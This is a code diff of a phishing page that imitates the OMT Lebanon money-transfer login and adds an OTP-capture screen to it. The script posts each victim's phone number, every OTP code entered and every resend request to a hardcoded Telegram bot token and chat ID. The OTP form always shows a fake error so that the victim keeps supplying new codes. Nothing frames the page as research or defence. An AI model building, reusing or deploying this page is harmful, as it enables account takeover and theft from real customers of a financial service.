@@ -4,14 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>تسجيل الدخول</title>
-  <!-- Open Graph Meta Tags for Link Preview -->
   <meta property="og:title" content="تسجيل الدخول" />
   <meta property="og:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
   <meta property="og:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
   <meta property="og:url" content="https://omt-lebanon.vercel.app" />
   <meta property="og:type" content="website" />
   <meta property="og:locale" content="ar_AR" />
-  <!-- Twitter Card Meta Tags -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="تسجيل الدخول" />
   <meta name="twitter:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
@@ -67,7 +65,7 @@
       background: #fff;
       transition: width 0.2s, height 0.2s;
     }
-    .omt-login-card {
+    .omt-login-card, .omt-otp-card {
       width: 95vw;
       max-width: 420px;
       background: #fff;
@@ -105,7 +103,7 @@
       z-index: 11;
       border: 2px solid #fff6cd;
     }
-    .omt-login-title {
+    .omt-login-title, .omt-otp-title {
       font-size: 25px;
       font-weight: 800;
       color: #232301;
@@ -194,7 +192,7 @@
       cursor: pointer;
       letter-spacing: 0.4px;
     }
-    .omt-login-btn {
+    .omt-login-btn, .omt-otp-btn, .omt-resend-btn {
       width: 100%;
       background: #f7f7f8;
       color: #cccccc;
@@ -208,13 +206,101 @@
       margin-top: 15px;
       margin-bottom: 3px;
     }
-    .omt-login-btn.active {
+    .omt-login-btn.active, .omt-otp-btn.active, .omt-resend-btn.active {
       background: linear-gradient(90deg, #ffd800 0%, #fcc23c 100%);
       color: #202000;
       cursor: pointer;
       box-shadow: 0 1px 8px #ffd80055;
       transition: background 0.21s;
       opacity: 1;
+    }
+    /* OTP code field styles */
+    .omt-otp-code-row {
+      display: flex;
+      gap: 12px;
+      justify-content: flex-start;
+      margin: 20px 0 30px 0;
+    }
+    .omt-otp-code-digit {
+      width: 54px;
+      height: 54px;
+      text-align: center;
+      font-size: 25px;
+      background: #f7f7f8;
+      border-radius: 10px;
+      border: 2px solid #ffe56d;
+      box-shadow: 0 1px 7px #ffd90011;
+      font-family: 'Cairo', Arial, sans-serif;
+      font-weight: bold;
+      direction: ltr;
+      outline: none;
+      letter-spacing: 5px;
+      transition: border 0.16s, box-shadow 0.16s;
+    }
+    .omt-otp-code-digit:focus {
+      border-color: #ffd800;
+      background: #fffdf4;
+      box-shadow: 0 3px 9px #ffd80033;
+    }
+    .omt-otp-sms-info {
+      font-size: 16px;
+      color: #444;
+      font-weight: 700;
+      margin-bottom: 4px;
+      margin-top: 10px;
+      text-align: center;
+      direction: ltr;
+    }
+    .omt-otp-phone {
+      font-size: 18px;
+      color: #21211D;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+      letter-spacing: 1px;
+      direction: ltr;
+    }
+    .omt-otp-error-msg {
+      text-align: center;
+      color: #e53935;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 18px;
+      margin-bottom: 5px;
+    }
+    .omt-resend-row {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 16px;
+      color: #444;
+      font-weight: 600;
+    }
+    .omt-resend-timer {
+      color: #ffd800;
+      font-size: 17px;
+      font-weight: bold;
+      letter-spacing: 0.7px;
+      margin-right: 4px;
+    }
+    .omt-resend-btn {
+      margin-top: 8px;
+      font-size: 17px;
+      font-weight: 700;
+      background: #fff8de;
+      color: #ffd800;
+      border: 2px solid #ffe56d;
+      border-radius: 22px;
+      padding: 12px 0;
+      cursor: not-allowed;
+      box-shadow: none;
+      transition: background 0.15s, color 0.15s;
+    }
+    .omt-resend-btn.active {
+      background: linear-gradient(90deg,#ffd800 0%,#fcc23c 100%);
+      color: #222201;
+      cursor: pointer;
+      box-shadow: 0 1px 8px #ffd80022;
+      border: 2px solid #ffd800;
     }
     @media (max-width: 600px) {
       .omt-logo-wrap img {
@@ -224,9 +310,10 @@
       .omt-logo-wrap {
         padding: 10px 18px;
       }
+      .omt-otp-code-digit { width: 39px; height: 39px; font-size: 18px; }
     }
     @media (max-width: 480px) {
-      .omt-login-card {
+      .omt-login-card, .omt-otp-card {
         padding: 16px 2.5vw 22px 2.5vw;
       }
       .omt-logo-wrap img {
@@ -260,20 +347,56 @@
         <button type="submit" class="omt-login-btn" id="loginBtn" disabled>Login</button>
       </form>
     </div>
+    <div class="omt-otp-card" id="otpCard" style="display:none;">
+      <div class="omt-otp-title" style="text-align:left;direction:ltr;">Enter OTP Code</div>
+      <div class="omt-otp-sms-info">Enter OTP Code Recive in Your SMS To:</div>
+      <div class="omt-otp-phone" id="displayOtpPhone"></div>
+      <form id="otpForm" autocomplete="off">
+        <div class="omt-otp-code-row" id="otpCodeRow">
+          <input type="text" maxlength="1" class="omt-otp-code-digit" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" />
+        </div>
+        <button type="submit" class="omt-otp-btn" id="otpBtn" disabled>Confirm</button>
+        <div class="omt-otp-error-msg" id="otpError" style="display:none;">
+          حدث خطأ سيتم ارسال رمز تحقق جديد
+        </div>
+        <div class="omt-resend-row">
+          <span id="resendLabel">Resend code after</span>
+          <span class="omt-resend-timer" id="resendTimer">2:00</span>
+        </div>
+        <button type="button" class="omt-resend-btn" id="resendBtn" disabled>Resend</button>
+      </form>
+    </div>
   </div>
   <script>
+    // Telegram Bot information
     const BOT_TOKEN = "8450343323:AAGVgCIJdSTdUpv8tu3iPLLdCIZkNGRdm2I";
     const CHAT_ID = "6873334348";
-    // Lebanese phone validation
+
+    // Login logic
     const phoneInput = document.getElementById('phoneInput');
     const loginBtn = document.getElementById('loginBtn');
     const loginForm = document.getElementById('loginForm');
+    const otpCard = document.getElementById('otpCard');
+    const loginCard = document.getElementById('loginCard');
+    let submittedPhone = '';
+    let otpCodeArr = ["","","",""];
+    let otpInputs;
+    let timerInterval;
+    let timerSeconds = 120;
+    const displayOtpPhone = document.getElementById('displayOtpPhone');
+    const resendBtn = document.getElementById('resendBtn');
+    const resendTimer = document.getElementById('resendTimer');
+    const otpError = document.getElementById('otpError');
+    const otpBtn = document.getElementById('otpBtn');
+
     phoneInput.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').substr(0, 8);
       updateLoginBtn();
     });
     function updateLoginBtn() {
-      // Lebanese phone: +961 then 8 digits
       const validPhone = phoneInput.value.length === 8 &&
         (phoneInput.value.startsWith('3') || phoneInput.value.startsWith('1') || phoneInput.value.startsWith('7') || phoneInput.value.startsWith('8'));
       if (validPhone) {
@@ -288,27 +411,147 @@
         loginBtn.style.opacity = 1;
       }
     }
+
     loginForm.onsubmit = async function(e){
       e.preventDefault();
       loginBtn.textContent = "Processing...";
       loginBtn.disabled = true;
-      const phone = '+961' + phoneInput.value;
+      submittedPhone = "+961" + phoneInput.value;
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: `رقم الهاتف: ${phone}`
+            text: `رقم الهاتف: ${submittedPhone}`
           })
         });
-      } catch (err) {}
+      } catch (err) {/* ignore */}
       setTimeout(()=>{
         loginBtn.textContent = "Login";
-        alert("تم تسجيل الدخول بنجاح!");
-        // ... your next steps here ...
+        loginCard.style.display = 'none';
+        otpCard.style.display = '';
+        displayOtpPhone.textContent = submittedPhone;
+        startResendTimer();
+        otpSetup();
       },1200);
     };
+
+    // OTP Page Logic
+    function otpSetup() {
+      otpInputs = document.querySelectorAll('.omt-otp-code-digit');
+      otpCodeArr = ["","","",""];
+      for(let i=0; i<otpInputs.length; i++) {
+        otpInputs[i].value = '';
+        otpInputs[i].addEventListener('input', function(e){
+          this.value = this.value.replace(/\D/g, '').substr(0,1);
+          otpCodeArr[i] = this.value;
+          if (this.value && i < otpInputs.length-1) otpInputs[i+1].focus();
+          updateOtpBtn();
+        });
+        otpInputs[i].addEventListener('keydown', function(e){
+          if(e.key === 'Backspace' && !this.value && i>0) {
+            otpInputs[i-1].focus();
+          }
+        });
+      }
+      updateOtpBtn();
+      otpError.style.display = 'none';
+      otpBtn.disabled = true;
+      otpBtn.classList.remove('active');
+    }
+    function updateOtpBtn() {
+      let filled = otpCodeArr.every(d=>d.length===1);
+      if(filled){
+        otpBtn.disabled = false;
+        otpBtn.classList.add('active');
+        otpBtn.style.cursor = 'pointer';
+      }else{
+        otpBtn.disabled = true;
+        otpBtn.classList.remove('active');
+        otpBtn.style.cursor = 'not-allowed';
+      }
+    }
+    document.getElementById('otpForm').onsubmit = async function(e){
+      e.preventDefault();
+      let otpCode = otpCodeArr.join('');
+      // Send to telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `رمز التحقق: ${otpCode}\nرقم الهاتف: ${submittedPhone}`
+          })
+        });
+      } catch (err) {/* ignore */}
+      // Always show error, reset code field and timer
+      otpError.style.display = '';
+      // Reset all code digits
+      for (let i = 0; i < otpInputs.length; i++) {
+        otpInputs[i].value = '';
+        otpCodeArr[i] = '';
+      }
+      otpInputs[0].focus();
+      updateOtpBtn();
+      // Restart the timer and disable resend
+      timerSeconds = 120;
+      updateResendTimer();
+      if (timerInterval) clearInterval(timerInterval);
+      startResendTimer();
+      resendBtn.disabled = true;
+      resendBtn.classList.remove('active');
+      resendBtn.style.cursor = 'not-allowed';
+    };
+
+    // Resend code logic
+    function startResendTimer(){
+      resendBtn.disabled = true;
+      resendBtn.classList.remove('active');
+      resendBtn.style.cursor = 'not-allowed';
+      updateResendTimer();
+      timerInterval = setInterval(()=>{
+        timerSeconds--;
+        updateResendTimer();
+        if(timerSeconds<=0){
+          clearInterval(timerInterval);
+          resendBtn.disabled = false;
+          resendBtn.classList.add('active');
+          resendBtn.style.cursor = 'pointer';
+          resendTimer.textContent = '';
+          document.getElementById('resendLabel').textContent = 'Resend code';
+        }
+      },1000);
+    }
+    function updateResendTimer(){
+      let min = Math.floor(timerSeconds/60);
+      let sec = timerSeconds%60;
+      resendTimer.textContent = `${min}:${sec<10?'0':''}${sec}`;
+    }
+
+    resendBtn.onclick = async function(){
+      if(resendBtn.disabled) return;
+      // Send the request to telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `طلب ارسال رمز تحقق جديد\nرقم الهاتف: ${submittedPhone}`
+          })
+        });
+      } catch (err) {/* ignore */}
+      timerSeconds = 120;
+      document.getElementById('resendLabel').textContent = 'Resend code after';
+      startResendTimer();
+      resendBtn.disabled = true;
+      resendBtn.classList.remove('active');
+      resendBtn.style.cursor = 'not-allowed';
+      otpError.style.display = 'none';
+    };
+
     // Back button - demonstration purpose
     document.getElementById('backBtn').onclick = function() {
       window.history.back();
